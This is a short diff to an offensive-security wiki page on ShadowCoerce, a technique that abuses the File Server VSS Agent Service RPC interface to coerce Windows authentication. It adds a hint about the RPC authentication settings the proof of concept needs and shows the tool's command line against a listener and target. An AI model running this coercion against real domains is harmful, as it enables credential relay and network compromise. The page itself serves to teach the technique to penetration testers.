@@ -18,6 +18,10 @@ A requirement to the abuse is to have the "File Server VSS Agent Service" enable
 
 The following Python proof-of-concept ([https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)) implements the `IsPathSupported` and `IsPathShadowCopied` methods.
 
+{% hint style="success" %}
+**Nota bene**: for the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) can  required. It is enabled by default in the script.
+{% endhint %}
+
 ```bash
 shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
 ```
